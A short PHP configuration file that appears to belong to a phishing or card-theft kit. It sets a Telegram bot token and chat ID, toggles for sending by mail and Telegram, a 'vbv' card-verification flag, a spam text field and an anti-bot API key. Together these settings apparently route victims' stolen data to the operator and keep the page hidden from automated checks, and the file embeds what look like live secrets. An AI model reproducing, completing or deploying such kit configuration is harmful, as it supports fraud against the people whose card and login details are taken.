<?php

$test_mode = false;
$mail_sending = true;
$telegram_sending = true;
$bot_n = "5854245489:AAFoED-e_5u5huNkmhrx6438MIknyXDf8Qc";
$chat_login = "1208278797";   
$my_mail = "";
$vbv = true;
$txtspam ="";
$apiantibot = "12fea86123a2555ed4ebb343ea08e8b4";
?>
